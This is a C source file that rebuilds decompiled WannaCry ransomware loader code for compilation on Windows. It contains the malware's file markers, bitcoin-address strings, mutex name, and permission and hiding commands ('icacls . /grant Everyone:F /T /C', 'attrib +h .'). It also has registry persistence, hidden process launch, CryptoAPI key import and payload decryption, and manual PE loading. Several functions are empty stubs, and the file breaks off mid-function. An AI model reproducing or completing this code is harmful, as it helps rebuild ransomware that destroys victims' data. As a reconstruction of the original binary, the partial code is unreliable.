/*
 * Codigo corregido y adaptado para compilacion en entorno Windows (MSVC / GCC)
 */

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stddef.h>
#include <stdint.h>

/* --- Definicion de tipos primitivos e inferidos por descompilador --- */
typedef unsigned char   undefined;
typedef unsigned char   undefined1;
typedef unsigned short  undefined2;
typedef unsigned int    undefined4;

typedef unsigned char   bool;
typedef unsigned char   byte;
typedef unsigned int    dword;
typedef pointer32       ImageBaseOffset32; // Mapeado a uint32_t si pointer32 no existe
typedef void*           pointer;
typedef void*           pointer32;

typedef long long       longlong;
typedef unsigned char   uchar;
typedef unsigned int    uint;
typedef unsigned long   ulong;
typedef unsigned short  ushort;
typedef unsigned short  wchar16;
typedef unsigned short  word;

/* --- Estructuras avanzadas de Exception Handling & PE structures --- */
typedef struct _s_HandlerType HandlerType;
typedef struct TypeDescriptor TypeDescriptor;

struct TypeDescriptor {
    void *pVFTable;
    void *spare;
    char name[1];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef int __ehstate_t;

typedef struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
} UnwindMapEntry;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
        dword OffsetToDirectory:31;
        dword DataIsDirectory:1;
    } IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
} TryBlockMapEntry;

typedef struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
} FuncInfo;

typedef void (*PMFN)(void *);

typedef struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
} PMD;

typedef struct _s_CatchableType {
    uint properties;
    struct TypeDescriptor *pType;
    struct PMD thisDisplacement;
    int sizeOrOffset;
    PMFN copyFunction;
} CatchableType;

typedef struct _s_CatchableTypeArray {
    int nCatchableTypes;
    CatchableType *arrayOfCatchableTypes[1];
} CatchableTypeArray;

typedef struct _s_ThrowInfo {
    uint attributes;
    PMFN pmfnUnwind;
    int (*pForwardCompat)(void);
    CatchableTypeArray *pCatchableTypeArray;
} ThrowInfo;

/* --- Declaracion de Variables Globales (Sin Duplicados) --- */
char s_c_wnry_0040e010[] = "c.wnry";
char DAT_0040e018 = 'r';
char DAT_0040e01c = 'w';
undefined DAT_0040e030;
undefined4 DAT_0040e04c;
HKEY hKey_80000001 = (HKEY)(ULONG_PTR)0x80000001;
undefined DAT_80000002;
undefined *_Source_0040e034;
WCHAR DAT_0040f874;
pointer PTR_FUN_004081d8;
void *ExceptionList;
undefined *PTR_DAT_0040f578;
undefined DAT_004076f4;
undefined DAT_004081e0;
char s_WANACRY__0040eb7c[] = "WANACRY!";

FARPROC DAT_0040f878;
FARPROC DAT_0040f87c;
FARPROC DAT_0040f880;
FARPROC DAT_0040f884;
FARPROC DAT_0040f888;
FARPROC DAT_0040f88c;
FARPROC _DAT_0040f890;
FARPROC DAT_0040f894;
FARPROC DAT_0040f898;
FARPROC DAT_0040f89c;
FARPROC DAT_0040f8a0;
FARPROC DAT_0040f8a4;
FARPROC _DAT_0040f8a8;

char s_CloseHandle_0040eb94[] = "CloseHandle";
char s_DeleteFileW_0040eba0[] = "DeleteFileW";
char s_MoveFileExW_0040ebac[] = "MoveFileExW";
char s_MoveFileW_0040ebb8[] = "MoveFileW";
char s_ReadFile_0040ebc4[] = "ReadFile";
char s_WriteFile_0040ebd0[] = "WriteFile";
char s_CreateFileW_0040ebdc[] = "CreateFileW";
char s_kernel32_dll_0040ebe8[] = "kernel32.dll";
pointer PTR_FUN_004081ec;
undefined DAT_0040ebf8;
undefined DAT_004081f0;

char s_advapi32_dll_0040e020[] = "advapi32.dll";
char s_CryptGenKey_0040f0c4[] = "CryptGenKey";
char s_CryptDecrypt_0040f0d0[] = "CryptDecrypt";
char s_CryptEncrypt_0040f0e0[] = "CryptEncrypt";
char s_CryptDestroyKey_0040f0f0[] = "CryptDestroyKey";
char s_CryptImportKey_0040f100[] = "CryptImportKey";
char s_CryptAcquireContextA_0040f110[] = "CryptAcquireContextA";
LPCSTR lpMultiByteStr_0040f8ac;
char s_cmd_exe__c___s__0040f42c[] = "cmd.exe /c \"%s\"";
LPCSTR lpName_0000080a = (LPCSTR)0x80a;
LPCSTR lpType_0040f43c = (LPCSTR)0x100;
char s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440[] = "115p7UMMngoj1pMvkpHijcRdfJNXj6Lr";
char s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464[] = "12t9YDPgwueZ9NyMgw519p7AA8isjr6S";
char s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488[] = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb";
char s_Global_MsWinZonesCacheCounterMut_0040f4b4[] = "Global\\MsWinZonesCacheCounterMut";
char *_Format_0040f4ac;
CHAR DAT_0040f910;
char s_tasksche_exe_0040f4d8[] = "tasksche.exe";
char *_Str2_0040f538;
char s_TaskStart_0040f4e8[] = "TaskStart";
char s_t_wnry_0040f4f4[] = "t.wnry";
char s_icacls____grant_Everyone_F__T__C_0040f4fc[] = "icacls . /grant Everyone:F /T /C";
char s_attrib__h___0040f520[] = "attrib +h .";
undefined LAB_0040216e;
undefined LAB_00402185;
undefined LAB_004021a3;
char s_GetNativeSystemInfo_0040f55c[] = "GetNativeSystemInfo";
undefined DAT_0040f53c;

int DAT_0040f938;

/* --- Prototipos de Funciones Incompletas o de Terceros --- */
void operator_delete(void* p) { free(p); }
void FUN_004076c8(void) {}
void FUN_00402a46(void *p) {}
void FUN_00402a6f(void *p) {}
void FUN_00402a76(void *a, void *b, uint *c, size_t d, byte *e) {}
void FUN_00403a77(void *a, byte *b, byte *c, uint d, int e) {}
void *FUN_004075ad(void) { return NULL; }
void FUN_004075c4(int *a, int b, int *c) {}
void FUN_0040763d(int *a, char *b, char *c) {}
void FUN_00407656(int *a) {}
void local_unwind2(void *a, DWORD b) {}
int* __p___argc(void) { static int a = 0; return &a; }
char*** __p___argv(void) { static char** v = NULL; static char*** p = &v; return p; }

/* Prototipos de funciones internas */
bool __cdecl FUN_00401000(void *param_1, int param_2);
undefined4 __cdecl FUN_00401064(LPSTR param_1, DWORD param_2, LPDWORD param_3);
undefined4 __cdecl FUN_004010fd(int param_1);
void __cdecl FUN_00401225(int param_1);
undefined4 * FUN_004012fd(void);
void * __thiscall FUN_0040135e(void *this_ptr, byte param_1);
void FUN_0040137a(void);
undefined4 __fastcall FUN_004013ce(int param_1);
undefined4 __thiscall FUN_00401437(void *this_ptr, LPCSTR param_1, undefined4 param_2, undefined4 param_3);
byte * __thiscall FUN_004014a6(void *this_ptr, LPCSTR param_1, uint *param_2);
undefined4 FUN_0040170a(void);
undefined4 * __fastcall FUN_004017dd(undefined4 *param_1);
void __fastcall FUN_0040181b(undefined4 *param_1);
undefined4 __fastcall FUN_0040182c(int param_1);
undefined4 __thiscall FUN_00401861(void *this_ptr, LPCSTR param_1);
undefined4 __fastcall FUN_004018b9(int param_1);
undefined4 __cdecl FUN_004018f9(undefined4 param_1, undefined4 param_2, LPCSTR param_3);
undefined4 __thiscall FUN_004019e1(void *this_ptr, void *param_1, size_t param_2, void *param_3, size_t *param_4);
undefined4 FUN_00401a45(void);
int __cdecl FUN_0040264f(int *param_1, int param_2);
bool __cdecl FUN_0040267b(int *param_1, int *param_2);
bool __cdecl FUN_00402758(int *param_1, int param_2);
undefined4 __cdecl FUN_00402457(uint param_1, uint param_2);
undefined4 __cdecl FUN_00402470(int param_1, uint param_2, int param_3, int *param_4);
bool __cdecl FUN_0040254b(int *param_1);
undefined4 __cdecl FUN_0040271d(int *param_1);
uint * __cdecl FUN_004021e9(short *param_1, uint param_2, undefined *param_3, undefined *param_4, uint param_5, undefined *param_6, uint param_7, uint param_8);
void __cdecl FUN_004021bd(short *param_1, uint param_2);

/* --- Implementacion de las funciones del Malware descompilado --- */

bool __cdecl FUN_00401000(void *param_1, int param_2) {
  FILE *_File;
  size_t sVar1;
  bool bVar2;
  char *_Mode;

  if (param_2 == 0) {
    _Mode = &DAT_0040e018;
  } else {
    _Mode = &DAT_0040e01c;
  }
  _File = fopen(s_c_wnry_0040e010, _Mode);
  if (_File == NULL) {
    bVar2 = 0;
  } else {
    if (param_2 == 0) {
      sVar1 = fwrite(param_1, 0x30c, 1, _File);
    } else {
      sVar1 = fread(param_1, 0x30c, 1, _File);
    }
    bVar2 = sVar1 != 0;
    fclose(_File);
  }
  return bVar2;
}

undefined4 __cdecl FUN_00401064(LPSTR param_1, DWORD param_2, LPDWORD param_3) {
  BOOL BVar1;
  DWORD DVar2;
  undefined4 uVar3;
  int iVar4;
  LPSTR *ppCVar5;
  STARTUPINFOA local_58;
  PROCESS_INFORMATION local_14;

  local_58.cb = sizeof(STARTUPINFOA);
  ppCVar5 = &local_58.lpReserved;
  for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 - 1) {
    *ppCVar5 = NULL;
    ppCVar5 = ppCVar5 + 1;
  }
  local_14.hProcess = NULL;
  local_14.hThread = NULL;
  local_14.dwProcessId = 0;
  local_14.dwThreadId = 0;
  uVar3 = 1;
  local_58.wShowWindow = 0;
  local_58.dwFlags = 1;
  BVar1 = CreateProcessA(NULL, param_1, NULL, NULL, FALSE, 0x8000000, NULL, NULL, &local_58, &local_14);
  if (BVar1 == 0) {
    uVar3 = 0;
  } else {
    if (param_2 != 0) {
      DVar2 = WaitForSingleObject(local_14.hProcess, param_2);
      if (DVar2 != 0) {
        TerminateProcess(local_14.hProcess, 0xffffffff);
      }
      if (param_3 != NULL) {
        GetExitCodeProcess(local_14.hProcess, param_3);
      }
    }
    CloseHandle(local_14.hProcess);
    CloseHandle(local_14.hThread);
  }
  return uVar3;
}

undefined4 __cdecl FUN_004010fd(int param_1) {
  size_t sVar1;
  LSTATUS LVar2;
  int iVar3;
  undefined4 *puVar4;
  wchar_t *pwVar5;
  bool bVar6;
  HKEY hKey;
  BYTE local_2e0[520];
  undefined4 local_2df;
  wchar_t local_d8[10];
  undefined4 local_c4[45];
  DWORD local_10;
  int local_c;

  puVar4 = &DAT_0040e04c;
  pwVar5 = local_d8;
  for (iVar3 = 5; iVar3 != 0; iVar3 = iVar3 - 1) {
    *(undefined4 *)pwVar5 = *puVar4;
    puVar4 = puVar4 + 1;
    pwVar5 = pwVar5 + 2;
  }
  local_2e0[0] = '\0';
  hKey = NULL;
  puVar4 = local_c4;
  for (iVar3 = 0x2d; iVar3 != 0; iVar3 = iVar3 - 1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  wcscat(local_d8, (wchar_t *)&_Source_0040e034);
  local_c = 0;
  do {
    if (local_c == 0) {
      hKey = (HKEY)(ULONG_PTR)0x80000002;
    } else {
      hKey = hKey_80000001;
    }
    RegCreateKeyW(hKey, local_d8, &hKey);
    if (hKey != NULL) {
      if (param_1 == 0) {
        local_10 = 0x207;
        LVar2 = RegQueryValueExA(hKey, (LPCSTR)&DAT_0040e030, NULL, NULL, local_2e0, &local_10);
        bVar6 = (LVar2 == 0);
        if (bVar6) {
          SetCurrentDirectoryA((LPCSTR)local_2e0);
        }
      } else {
        GetCurrentDirectoryA(0x207, (LPSTR)local_2e0);
        sVar1 = strlen((char *)local_2e0);
        LVar2 = RegSetValueExA(hKey, (LPCSTR)&DAT_0040e030, 0, 1, local_2e0, (DWORD)(sVar1 + 1));
        bVar6 = (LVar2 == 0);
      }
      RegCloseKey(hKey);
      if (bVar6) {
        return 1;
      }
    }
    local_c = local_c + 1;
    if (1 < local_c) {
      return 0;
    }
  } while (1);
}

void __cdecl FUN_00401225(int param_1) {
  size_t sVar1;
  int iVar2;
  int iVar3;
  uint _Seed;
  int iVar4;
  undefined4 *puVar5;
  WCHAR *pWVar6;
  int iVar7;
  WCHAR local_19c;
  undefined4 local_19a[99];
  DWORD local_c;
  uint local_8;

  local_19c = DAT_0040f874;
  local_c = 399;
  puVar5 = local_19a;
  for (iVar3 = 99; iVar3 != 0; iVar3 = iVar3 - 1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  GetComputerNameW(&local_19c, &local_c);
  local_8 = 0;
  _Seed = 1;
  sVar1 = wcslen(&local_19c);
  if (sVar1 != 0) {
    pWVar6 = &local_19c;
    do {
      _Seed = _Seed * (ushort)*pWVar6;
      local_8 = local_8 + 1;
      pWVar6 = pWVar6 + 1;
      sVar1 = wcslen(&local_19c);
    } while (local_8 < sVar1);
  }
  srand(_Seed);
  iVar3 = rand();
  iVar7 = 0;
  iVar4 = iVar3 % 8 + 8;
  if (0 < iVar4) {
    do {
      iVar2 = rand();
      *(char *)(iVar7 + param_1) = (char)(iVar2 % 0x1a) + 'a';
      iVar7 = iVar7 + 1;
    } while (iVar7 < iVar4);
  }
  for (; iVar7 < iVar3 % 8 + 0xb; iVar7 = iVar7 + 1) {
    iVar4 = rand();
    *(char *)(iVar7 + param_1) = (char)(iVar4 % 10) + '0';
  }
  *(char *)(iVar7 + param_1) = 0;
}

undefined4 * FUN_004012fd(void) {
  undefined4 *extraout_ECX = (undefined4*)malloc(0x500);
  FUN_004076c8();
  FUN_004017dd(extraout_ECX + 1);
  FUN_004017dd(extraout_ECX + 0xb);
  FUN_00402a46(extraout_ECX + 0x15);
  extraout_ECX[0x132] = 0;
  extraout_ECX[0x133] = 0;
  extraout_ECX[0x134] = 0;
  extraout_ECX[0x135] = 0;
  *extraout_ECX = (uintptr_t)&PTR_FUN_004081d8;
  return extraout_ECX;
}

void * __thiscall FUN_0040135e(void *this_ptr, byte param_1) {
  FUN_0040137a();
  if ((param_1 & 1) != 0) {
    operator_delete(this_ptr);
  }
  return this_ptr;
}

void FUN_0040137a(void) {
  undefined4 *extraout_ECX = (undefined4*)malloc(0x500);
  FUN_004076c8();
  *extraout_ECX = (uintptr_t)&PTR_FUN_004081d8;
  FUN_004013ce((int)(uintptr_t)extraout_ECX);
  FUN_00402a6f(extraout_ECX + 0x15);
  FUN_0040181b(extraout_ECX + 0xb);
  FUN_0040181b(extraout_ECX + 1);
}

undefined4 __fastcall FUN_004013ce(int param_1) {
  undefined1 *puVar1;
  int iVar2;
  int iVar3;

  FUN_004018b9(param_1 + 4);
  FUN_004018b9(param_1 + 0x2c);
  puVar1 = *(undefined1 **)(param_1 + 0x4c8);
  iVar3 = 0x100000;
  if (puVar1 != NULL) {
    iVar2 = 0x100000;
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar2 = iVar2 - 1;
    } while (iVar2 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4c8));
    *(undefined4 *)(param_1 + 0x4c8) = 0;
  }
  puVar1 = *(undefined1 **)(param_1 + 0x4cc);
  if (puVar1 != NULL) {
    do {
      *puVar1 = 0;
      puVar1 = puVar1 + 1;
      iVar3 = iVar3 - 1;
    } while (iVar3 != 0);
    GlobalFree(*(HGLOBAL *)(param_1 + 0x4cc));
    *(undefined4 *)(param_1 + 0x4cc) = 0;
  }
  return 1;
}

undefined4 __thiscall FUN_00401437(void *this_ptr, LPCSTR param_1, undefined4 param_2, undefined4 param_3) {
  int iVar1;
  HGLOBAL pvVar2;

  iVar1 = FUN_00401861((void *)((intptr_t)this_ptr + 4), param_1);
  if (iVar1 != 0) {
    if (param_1 != NULL) {
      FUN_00401861((void *)((intptr_t)this_ptr + 0x2c), NULL);
    }
    pvVar2 = GlobalAlloc(0, 0x100000);
    *(HGLOBAL *)((intptr_t)this_ptr + 0x4c8) = pvVar2;
    if (pvVar2 != NULL) {
      pvVar2 = GlobalAlloc(0, 0x100000);
      *(HGLOBAL *)((intptr_t)this_ptr + 0x4cc) = pvVar2;
      if (pvVar2 != NULL) {
        *(undefined4 *)((intptr_t)this_ptr + 0x4d4) = param_2;
        *(undefined4 *)((intptr_t)this_ptr + 0x4d0) = param_3;
        return 1;
      }
    }
  }
  return 0;
}

typedef BOOL (WINAPI *ReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);

byte * __thiscall FUN_004014a6(void *this_ptr, LPCSTR param_1, uint *param_2) {
  byte *pbVar1;
  HANDLE hFile;
  int iVar2;
  byte *pbVar3;
  size_t local_248[2];
  undefined1 local_240;
  uint local_238;
  uint local_234;
  byte local_230[512];
  size_t local_30;
  byte *local_2c;
  LARGE_INTEGER local_28;
  uint local_20[3];
  void *local_14;

  pbVar3 = NULL;
  local_30 = 0;
  local_248[0] = 0;
  local_240 = 0;
  local_248[1] = 0;
  local_20[0] = 0;

  hFile = CreateFileA(param_1, 0x80000000, 1, NULL, 3, 0, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    GetFileSizeEx(hFile, &local_28);
    if ((local_28.HighPart < 1) && (local_28.LowPart < 0x6400001)) {
      ReadFile_t pReadFile = (ReadFile_t)DAT_0040f880;
      if (pReadFile) {
        iVar2 = pReadFile(hFile, &local_240, 8, (LPDWORD)local_20, NULL);
        if (iVar2 != 0) {
          iVar2 = memcmp(&local_240, s_WANACRY__0040eb7c, 8);
          if (iVar2 == 0) {
            iVar2 = pReadFile(hFile, local_248, 4, (LPDWORD)local_20, NULL);
            if ((iVar2 != 0) && (local_248[0] == 0x100)) {
              iVar2 = pReadFile(hFile, *(undefined4 **)((intptr_t)this_ptr + 0x4c8), 0x100, (LPDWORD)local_20, NULL);
              if (iVar2 != 0) {
                iVar2 = pReadFile(hFile, local_248 + 1, 4, (LPDWORD)local_20, NULL);
                if (iVar2 != 0) {
                  iVar2 = pReadFile(hFile, &local_238, 8, (LPDWORD)local_20, NULL);
                  if ((iVar2 != 0) && ((int)local_234 < 1)) {
                    iVar2 = FUN_004019e1((void *)((intptr_t)this_ptr + 4), *(void **)((intptr_t)this_ptr + 0x4c8), local_248[0], local_230, &local_30);
                    if (iVar2 != 0) {
                      FUN_00402a76((void *)((intptr_t)this_ptr + 0x54), local_230, (uint *)PTR_DAT_0040f578, local_30, (byte *)0x10);
                      local_2c = (byte *)GlobalAlloc(0, local_238);
                      if (local_2c != NULL) {
                        iVar2 = pReadFile(hFile, *(undefined4 **)((intptr_t)this_ptr + 0x4c8), local_28.LowPart, (LPDWORD)local_20, NULL);
                        pbVar1 = local_2c;
                        if ((iVar2 != 0) && (local_20[0] != 0)) {
                          FUN_00403a77((void *)((intptr_t)this_ptr + 0x54), *(byte **)((intptr_t)this_ptr + 0x4c8), local_2c, local_20[0], 1);
                          *param_2 = local_238;
                          pbVar3 = pbVar1;
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return pbVar3;
}

undefined4 FUN_0040170a(void) {
  int iVar1;
  HMODULE hModule;

  iVar1 = FUN_00401a45();
  if (iVar1 != 0) {
    if (DAT_0040f878 != NULL) {
      return 1;
    }
    hModule = LoadLibraryA(s_kernel32_dll_0040ebe8);
    if (hModule != NULL) {
      DAT_0040f878 = GetProcAddress(hModule, s_CreateFileW_0040ebdc);
      DAT_0040f87c = GetProcAddress(hModule, s_WriteFile_0040ebd0);
      DAT_0040f880 = GetProcAddress(hModule, s_ReadFile_0040ebc4);
      DAT_0040f884 = GetProcAddress(hModule, s_MoveFileW_0040ebb8);
      DAT_0040f888 = GetProcAddress(hModule, s_MoveFileExW_0040ebac);
      DAT_0040f88c = GetProcAddress(hModule, s_DeleteFileW_0040eba0);
      _DAT_0040f890 = GetProcAddress(hModule, s_CloseHandle_0040eb94);
      if ((DAT_0040f878 != NULL) && (DAT_0040f87c != NULL) && (DAT_0040f880 != NULL) &&
          (DAT_0040f884 != NULL) && (DAT_0040f888 != NULL) && (DAT_0040f88c != NULL) && (_DAT_0040f890 != NULL)) {
        return 1;
      }
    }
  }
  return 0;
}

undefined4 * __fastcall FUN_004017dd(undefined4 *param_1) {
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  *param_1 = (uintptr_t)&PTR_FUN_004081ec;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
  return param_1;
}

void __fastcall FUN_0040181b(undefined4 *param_1) {
  *param_1 = (uintptr_t)&PTR_FUN_004081ec;
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
}

typedef BOOL (WINAPI *CryptAcquireContextA_t)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD);

undefined4 __fastcall FUN_0040182c(int param_1) {
  int iVar1;
  int iVar2 = 0;
  CryptAcquireContextA_t pCryptAcquireContext = (CryptAcquireContextA_t)DAT_0040f894;

  if (!pCryptAcquireContext) return 0;

  do {
    iVar1 = pCryptAcquireContext((HCRYPTPROV*)(param_1 + 4), NULL, (iVar2 != 0) ? "Provider" : NULL, 0x18, 0xf0000000);
    if (iVar1 != 0) {
      return 1;
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 2);
  return 0;
}

typedef BOOL (WINAPI *CryptImportKey_t)(HCRYPTPROV, CONST BYTE*, DWORD, HCRYPTKEY, DWORD, HCRYPTKEY*);

undefined4 __thiscall FUN_00401861(void *this_ptr, LPCSTR param_1) {
  int iVar1;
  CryptImportKey_t pCryptImportKey = (CryptImportKey_t)DAT_0040f898;

  iVar1 = FUN_0040182c((int)(uintptr_t)this_ptr);
  if (iVar1 != 0) {
    if (param_1 == NULL) {
      if (pCryptImportKey)
        iVar1 = pCryptImportKey(*(HCRYPTPROV*)((intptr_t)this_ptr + 4), (CONST BYTE*)&DAT_0040ebf8, 0x494, 0, 0, (HCRYPTKEY*)((intptr_t)this_ptr + 8));
    } else {
      iVar1 = FUN_004018f9(*(undefined4 *)((intptr_t)this_ptr + 4), (undefined4)((intptr_t)this_ptr + 8), param_1);
    }
    if (iVar1 != 0) {
      return 1;
    }
  }
  FUN_004018b9((int)(uintptr_t)this_ptr);
  return 0;
}

typedef BOOL (WINAPI *CryptDestroyKey_t)(HCRYPTKEY);

undefined4 __fastcall FUN_004018b9(int param_1) {
  CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t)DAT_0040f89c;
  if (*(int *)(param_1 + 8) != 0 && pCryptDestroyKey) {
    pCryptDestroyKey(*(HCRYPTKEY *)(param_1 + 8));
    *(undefined4 *)(param_1 + 8) = 0;
  }
  if (*(int *)(param_1 + 0xc) != 0 && pCryptDestroyKey) {
    pCryptDestroyKey(*(HCRYPTKEY *)(param_1 + 0xc));
    *(undefined4 *)(param_1 + 0xc) = 0;
  }
  if (*(HCRYPTPROV *)(param_1 + 4) != 0) {
    CryptReleaseContext(*(HCRYPTPROV *)(param_1 + 4), 0);
    *(undefined4 *)(param_1 + 4) = 0;
  }
  return 1;
}

undefined4 __cdecl FUN_004018f9(undefined4 param_1, undefined4 param_2, LPCSTR param_3) {
  HANDLE hFile;
  DWORD dwBytes;
  HGLOBAL lpBuffer;
  BOOL BVar1;
  int iVar2;
  undefined4 uVar3 = 0;
  DWORD local_20[3] = {0};
  CryptImportKey_t pCryptImportKey = (CryptImportKey_t)DAT_0040f898;

  hFile = CreateFileA(param_3, 0x80000000, 1, NULL, 3, 0, NULL);
  if (hFile != INVALID_HANDLE_VALUE) {
    dwBytes = GetFileSize(hFile, NULL);
    if ((dwBytes != INVALID_FILE_SIZE) && (dwBytes < 0x19001)) {
      lpBuffer = GlobalAlloc(0, dwBytes);
      if (lpBuffer != NULL) {
        BVar1 = ReadFile(hFile, lpBuffer, dwBytes, local_20, NULL);
        if (BVar1 != 0 && pCryptImportKey) {
          iVar2 = pCryptImportKey((HCRYPTPROV)param_1, (CONST BYTE*)lpBuffer, local_20[0], 0, 0, (HCRYPTKEY*)param_2);
          if (iVar2 != 0) {
            uVar3 = 1;
          }
        }
      }
    }
  }
  return uVar3;
}

typedef BOOL (WINAPI *CryptDecrypt_t)(HCRYPTKEY, HCRYPTHASH, BOOL, DWORD, BYTE*, DWORD*);

undefined4 __thiscall FUN_004019e1(void *this_ptr, void *param_1, size_t param_2, void *param_3, size_t *param_4) {
  LPCRITICAL_SECTION lpCriticalSection;
  int iVar1;
  CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t)DAT_0040f8a4;

  if (*(int *)((intptr_t)this_ptr + 8) != 0 && pCryptDecrypt) {
    lpCriticalSection = (LPCRITICAL_SECTION)((intptr_t)this_ptr + 0x10);
    EnterCriticalSection(lpCriticalSection);
    DWORD dwLen = (DWORD)param_2;
    iVar1 = pCryptDecrypt(*(HCRYPTKEY *)((intptr_t)this_ptr + 8), 0, TRUE, 0, (BYTE*)param_1, &dwLen);
    if (iVar1 != 0) {
      LeaveCriticalSection(lpCriticalSection);
      memcpy(param_3, param_1, dwLen);
      *param_4 = dwLen;
      return 1;
    }
    LeaveCriticalSection(lpCriticalSection);
  }
  return 0;
}

undefined4 FUN_00401a45(void) {
  HMODULE hModule;
  if (DAT_0040f894 == NULL) {
    hModule = LoadLibraryA(s_advapi32_dll_0040e020);
    if (hModule != NULL) {
      DAT_0040f894 = GetProcAddress(hModule, s_CryptAcquireContextA_0040f110);
      DAT_0040f898 = GetProcAddress(hModule, s_CryptImportKey_0040f100);
      DAT_0040f89c = GetProcAddress(hModule, s_CryptDestroyKey_0040f0f0);
      DAT_0040f8a0 = GetProcAddress(hModule, s_CryptEncrypt_0040f0e0);
      DAT_0040f8a4 = GetProcAddress(hModule, s_CryptDecrypt_0040f0d0);
      _DAT_0040f8a8 = GetProcAddress(hModule, s_CryptGenKey_0040f0c4);
      if ((DAT_0040f894 != NULL) && (DAT_0040f898 != NULL) && (DAT_0040f89c != NULL) &&
          (DAT_0040f8a0 != NULL) && (DAT_0040f8a4 != NULL) && (_DAT_0040f8a8 != NULL)) {
        return 1;
      }
    }
    return 0;
  }
  return 1;
}

undefined4 __cdecl FUN_00402457(uint param_1, uint param_2) {
  if (param_1 < param_2) {
    SetLastError(0xd);
    return 0;
  }
  return 1;
}

typedef void* (*AllocFunc_t)(uintptr_t, size_t, DWORD, DWORD, uintptr_t);

undefined4 __cdecl FUN_00402470(int param_1, uint param_2, int param_3, int *param_4) {
  size_t *psVar1;
  int iVar2;
  size_t sVar3;
  int iVar4;
  size_t *psVar5;
  int local_8 = 0;

  iVar2 = param_4[1];
  iVar4 = *param_4;
  psVar1 = (size_t *)((uint)*(ushort *)(iVar4 + 0x14) + iVar4);
  if (*(short *)(iVar4 + 6) != 0) {
    do {
      psVar5 = psVar1 + 10;
      if (*psVar5 == 0) {
        sVar3 = *(size_t *)(param_3 + 0x38);
        if (0 < (int)sVar3) {
          AllocFunc_t pAlloc = (AllocFunc_t)(uintptr_t)param_4[7];
          iVar4 = (pAlloc != NULL) ? (int)(uintptr_t)pAlloc(iVar2 + psVar1[9], sVar3, 0x1000, 4, param_4[0xc]) : 0;
          if (iVar4 == 0) return 0;
          psVar1[8] = iVar2 + psVar1[9];
          memset((void *)(iVar2 + psVar1[9]), 0, sVar3);
        }
      } else {
        iVar4 = FUN_00402457(param_2, psVar1[0xb] + *psVar5);
        AllocFunc_t pAlloc = (AllocFunc_t)(uintptr_t)param_4[7];
        if ((iVar4 == 0) || (pAlloc == NULL) ||
           (pAlloc(iVar2 + psVar1[9], *psVar5, 0x1000, 4, param_4[0xc]) == NULL)) {
          return 0;
        }
        sVar3 = psVar1[9];
        memcpy((void *)(iVar2 + sVar3), (void *)(psVar1[0xb] + param_1), *psVar5);
        psVar1[8] = iVar2 + sVar3;
      }
      local_8 = local_8 + 1;
      psVar1 = psVar5;
    } while (local_8 < (int)(uint)*(ushort *)(*param_4 + 6));
  }
  return 1;
}

int __cdecl FUN_0040264f(int *param_1, int param_2) {
  int iVar1 = *(int *)(param_2 + 0x10);
  if (iVar1 == 0) {
    if ((*(uint *)(param_2 + 0x24) & 0x40) != 0) {
      return *(int *)(*param_1 + 0x20);
    }
    if ((*(uint *)(param_2 + 0x24) & 0x80) != 0) {
      iVar1 = *(int *)(*param_1 + 0x24);
    }
  }
  return iVar1;
}

typedef void (*FreeFunc_t)(uintptr_t, size_t, DWORD, uintptr_t);

bool __cdecl FUN_0040267b(int *param_1, int *param_2) {
  uint dwSize = param_2[2];
  if (dwSize == 0) {
    return 1;
  } else {
    uint uVar1 = param_2[3];
    if ((uVar1 & 0x2000000) == 0) {
      DWORD flNewProtect = PAGE_READWRITE;
      BOOL BVar2 = VirtualProtect((LPVOID)(uintptr_t)*param_2, dwSize, flNewProtect, (PDWORD)&param_2);
      return BVar2 != 0;
    } else {
      if ((*param_2 == param_2[1]) &&
         (((param_2[4] != 0 || (*(uint *)(*param_1 + 0x38) == param_1[0xe])) ||
          (dwSize % (uint)param_1[0xe] == 0)))) {
        FreeFunc_t pFree = (FreeFunc_t)(uintptr_t)param_1[8];
        if (pFree) pFree(*param_2, dwSize, 0x4000, param_1[0xc]);
      }
      return 1;
    }
  }
}

bool __cdecl FUN_0040254b(int *param_1) {
  int iVar1, iVar2, *piVar3 = param_1;
  iVar1 = *(ushort *)(*param_1 + 0x14) + 0x18 + *param_1;
  uint local_20 = *(uint *)(iVar1 + 8);
  uint local_1c = ~(param_1[0xe] - 1U) & local_20;
